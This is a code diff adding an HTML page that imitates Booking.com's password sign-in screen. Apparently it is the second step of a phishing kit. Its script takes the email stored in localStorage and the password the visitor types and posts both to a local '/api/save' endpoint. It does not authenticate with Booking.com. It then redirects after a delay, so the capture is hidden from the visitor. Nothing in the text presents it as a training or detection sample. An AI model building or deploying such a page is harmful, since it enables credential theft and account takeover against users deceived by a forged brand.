@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Booking.com</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<div class="topbar">
+  <div class="logo">Booking.com</div>
+  <div class="menu">☰</div>
+</div>
+
+<div class="container">
+
+  <h2>Enter your Password</h2>
+
+  <p id="userText"></p>
+
+  <label>Password</label>
+  <div class="input-box">
+    <input id="Password" type="Password" placeholder="Enter your Password">
+    <span class="eye"></span>
+  </div>
+
+  <button id="btn" onclick="submitData()">Sign in</button>
+
+  <p class="help">Forgotten your Password?</p>
+
+  <hr>
+
+  <p class="footer-text">
+    By signing in or creating an account, you agree with our Terms & conditions and Privacy statement
+  </p>
+
+  <p class="copyright">
+    All rights reserved.<br>
+    Copyright (2006 - 2026) - Booking.com™
+  </p>
+
+</div>
+
+<script>
+const email = localStorage.getItem("email") || "";
+
+document.getElementById("userText").innerText =
+  "Please enter your Booking.com password for " + email;
+
+function submitData() {
+  const Password = document.getElementById("Password").value;
+  const btn = document.getElementById("btn");
+
+  if (!Password) {
+    alert("Enter your Password");
+    return;
+  }
+
+  btn.innerText = "Signing in...";
+  btn.disabled = true;
+
+  fetch("/api/save", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ email, Password })
+  });
+
+  setTimeout(() => {
+    window.location.href = "index.html";
+  }, 12000);
+}
+</script>
+
+</body>
+</html>
